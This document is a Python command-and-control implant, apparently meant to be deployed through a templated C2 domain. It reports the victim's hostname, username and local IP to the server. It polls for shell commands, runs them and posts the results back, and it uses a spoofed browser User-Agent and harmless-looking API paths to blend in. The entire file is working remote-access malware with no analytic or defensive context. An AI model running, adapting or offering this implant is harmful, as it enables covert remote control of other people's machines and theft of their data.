import requests
import time
import subprocess
import json
import uuid
import socket
import os
import urllib3

# Disable SSL warnings due to self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Unique agent ID for each implant
AGENT_ID = str(uuid.uuid4())

# C2 Server URL and endpoints
C2_BASE      = "https://${c2_domain}"
GET_ENDPOINT = "/api/v2/status"
POST_ENDPOINT= "/api/v2/users/update"

# Now that AGENT_ID exists, we can safely put it into our headers
HEADERS = {
    "Access-X-Control": "000000011110000000",
    "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36",
    "Agent-ID":         AGENT_ID,
}

SLEEP_INTERVAL = 2   # seconds between beacons
VERIFY_TLS     = True  # Change to False if you need to skip cert validation

def get_system_info():
    """ Gather basic system info about the agent """
    try:
        local_ip = subprocess.check_output(
            "hostname -I | awk '{print $1}'",
            shell=True, stderr=subprocess.DEVNULL
        ).decode('utf-8').strip()
    except Exception:
        local_ip = "unknown"

    return {
        "hostname":  socket.gethostname(),
        "username":  os.getenv("USER") or os.getenv("USERNAME"),
        "os":        os.name,
        "agent_id":  AGENT_ID,
        "local_ip":  local_ip
    }

def beacon():
    """ Poll the C2 server for a command """
    try:
        r = requests.get(
            C2_BASE + GET_ENDPOINT,
            headers=HEADERS,
            verify=VERIFY_TLS
        )
        if r.status_code == 200:
            resp = r.json()
            return resp.get('command')
    except Exception:
        pass
    return None

def send_output(output, info=None):
    """ Send command output back to the C2 """
    payload = {
        "output":   output,
        "hostname": socket.gethostname(),
        "agent_id": AGENT_ID
    }
    if info:
        payload.update(info)

    try:
        requests.post(
            C2_BASE + POST_ENDPOINT,
            headers=HEADERS,
            json=payload,
            verify=VERIFY_TLS
        )
    except Exception:
        pass

def execute_command(cmd):
    """ Execute shell command, return its stdout or error """
    try:
        out = subprocess.check_output(
            cmd, shell=True,
            stderr=subprocess.STDOUT,
            timeout=20
        )
        return out.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    print("[*] Starting C2 implant…")
    # Initial “new agent” callback
    send_output("[+] New agent online", info=get_system_info())

    last_cmd = None
    while True:
        command = beacon()
        if command:
            print(f"[+] Executing: {command}")
            output = execute_command(command)
            send_output(output)
        time.sleep(SLEEP_INTERVAL)
